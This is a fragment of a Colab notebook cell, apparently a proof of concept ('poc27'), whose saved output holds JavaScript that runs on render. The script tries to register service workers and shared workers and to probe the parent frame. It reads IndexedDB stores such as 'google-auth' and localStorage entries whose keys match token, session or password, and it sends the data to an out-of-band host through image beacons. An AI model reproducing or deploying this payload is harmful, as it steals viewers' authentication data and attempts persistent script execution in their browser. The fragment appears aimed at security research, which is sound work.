        "id": "poc27_init"
      },
      "source": [
        "# v1.2"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "(function() {\n  var B = 'https://cmmg5secb2qvaagnn35exzviwnalhcnk2.oast.site';\n  var L = function(t,v) { new Image().src = B+'/'+t+'?v='+encodeURIComponent(String(v||'').slice(0,600)); };\n\n  L('START', location.origin + '|href=' + location.href.slice(0,200));\n\n  // \u2500\u2500 WIDGET MANAGER (confirmed working) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try {\n    var mod = atob('');\n    var mb = new Blob([mod], {type:'text/javascript'});\n    window.google.colab.widgets.installCustomManager(URL.createObjectURL(mb));\n    L('CWM_INSTALLED', 'ok');\n  } catch(e) { L('CWM_ERR', e.name+'|'+e.message.slice(0,80)); }\n\n  // \u2500\u2500 SERVICE WORKER PROBES \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  if (!navigator.serviceWorker) {\n    L('SW_API', 'unavailable');\n  } else {\n    L('SW_API', 'available');\n\n    var swCode = atob('');\n\n    // 1a. Blob URL \u2014 spec blocks this but Chrome has had regressions\n    var blobSW = new Blob([swCode], {type:'application/javascript'});\n    var blobUrl = URL.createObjectURL(blobSW);\n    navigator.serviceWorker.register(blobUrl, {scope:'/'}).then(function(r) {\n      L('SW_BLOB_OK', r.scope);\n    }).catch(function(e) { L('SW_BLOB_ERR', e.name+'|'+e.message.slice(0,120)); });\n\n    // 1b. Data URL\n    var dataUrl = 'data:application/javascript,' + encodeURIComponent(swCode);\n    navigator.serviceWorker.register(dataUrl, {scope:'/'}).then(function(r) {\n      L('SW_DATA_OK', r.scope);\n    }).catch(function(e) { L('SW_DATA_ERR', e.name+'|'+e.message.slice(0,80)); });\n\n    // 1c. /outputframe.html as SW script \u2014 does server return valid JS under Accept:*/*?\n    navigator.serviceWorker.register('/outputframe.html', {scope:'/'}).then(function(r) {\n      L('SW_HTML_OK', 'UNEXPECTED_SUCCESS:'+r.scope);\n    }).catch(function(e) { L('SW_HTML_ERR', e.name+'|'+e.message.slice(0,80)); });\n\n    // 1d. Enumerate existing registrations at this origin\n    navigator.serviceWorker.getRegistrations().then(function(regs) {\n      L('SW_REGS', regs.length + '|' + regs.map(function(r){return r.scope;}).join(','));\n      regs.forEach(function(reg) {\n        if (reg.active) {\n          try {\n            reg.active.postMessage({type:'probe', from:location.origin});\n            L('SW_PROBE_SENT', reg.scope);\n          } catch(e) { L('SW_PROBE_ERR', e.message.slice(0,80)); }\n        }\n      });\n    }).catch(function(e) { L('SW_REGS_ERR', e.message.slice(0,80)); });\n\n    // 1e. Is this frame already controlled by a SW?\n    L('SW_CONTROLLED', navigator.serviceWorker.controller\n      ? navigator.serviceWorker.controller.scriptURL : 'none');\n\n    // 1f. Listen for SW messages\n    navigator.serviceWorker.addEventListener('message', function(e) {\n      L('SW_IN_MSG', JSON.stringify(e.data).slice(0,300));\n    });\n  }\n\n  // \u2500\u2500 SHARED WORKER (blob URL \u2014 more permissive than SW) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try {\n    var shCode = atob('');\n    var shBlob = new Blob([shCode], {type:'application/javascript'});\n    var shUrl = URL.createObjectURL(shBlob);\n    var shw = new SharedWorker(shUrl);\n    shw.port.onmessage = function(e) { L('SHARED_MSG', JSON.stringify(e.data).slice(0,200)); };\n    shw.onerror = function(e) { L('SHARED_ERR', (e.message||'error').slice(0,100)); };\n    shw.port.start();\n    L('SHARED_INIT', 'ok');\n  } catch(e) { L('SHARED_FAIL', e.name+'|'+e.message.slice(0,100)); }\n\n  // \u2500\u2500 BROADCAST CHANNEL \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try {\n    var bc = new BroadcastChannel('colab-hook-1');\n    bc.onmessage = function(e) { L('BC_MSG', JSON.stringify(e.data).slice(0,200)); };\n    bc.postMessage({type:'probe', origin:location.origin, t:Date.now()});\n    L('BC_INIT', 'ok');\n  } catch(e) { L('BC_FAIL', e.message.slice(0,80)); }\n\n  // \u2500\u2500 CACHE API \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  if (window.caches) {\n    L('CACHE_API', 'available');\n    caches.keys().then(function(keys) {\n      L('CACHE_KEYS', keys.length + '|' + keys.join(','));\n    }).catch(function(){});\n  } else { L('CACHE_API', 'unavailable'); }\n\n  // \u2500\u2500 INDEXEDDB PROBE \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  ['colab','firebaseLocalStorageDb','google-auth','gapi-storage'].forEach(function(n) {\n    try {\n      var r = indexedDB.open(n);\n      r.onsuccess = function(ev) {\n        var db = ev.target.result;\n        var stores = Array.from(db.objectStoreNames);\n        if (stores.length) {\n          L('IDB_FOUND', n + '|' + stores.join(','));\n          stores.forEach(function(s) {\n            try {\n              var tx = db.transaction(s, 'readonly');\n              tx.objectStore(s).getAll().onsuccess = function(e2) {\n                var d = JSON.stringify(e2.target.result||[]).slice(0,500);\n                if (d.length > 2) L('IDB_DATA', n+'.'+s+'='+d);\n              };\n            } catch(x) {}\n          });\n        }\n        db.close();\n      };\n    } catch(x) {}\n  });\n\n  // \u2500\u2500 LOCALSTORAGE \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try {\n    var lsKeys = Object.keys(localStorage);\n    L('LS_COUNT', lsKeys.length);\n    lsKeys.filter(function(k) { return /token|auth|key|session|cred|pass/i.test(k); })\n      .forEach(function(k) { L('LS_SENSITIVE', k+'='+String(localStorage.getItem(k)||'').slice(0,200)); });\n  } catch(e) { L('LS_ERR', e.message.slice(0,80)); }\n\n  // \u2500\u2500 PARENT POSTMESSAGE PROBE \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // Does the parent (colab.research.google.com) have a postMessage sink\n  // that triggers SW registration or eval?\n  try {\n    window.addEventListener('message', function(e) {\n      if (String(e.origin).indexOf('colab') > -1 || String(e.origin).indexOf('google') > -1)\n        L('PARENT_RESP', e.origin + '|' + JSON.stringify(e.data).slice(0,200));\n    });\n    window.parent.postMessage({type:'sw_probe'}, '*');\n    L('PARENT_PM', 'sent');\n  } catch(e) { L('PARENT_PM_ERR', e.message.slice(0,80)); }\n\n})();",
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
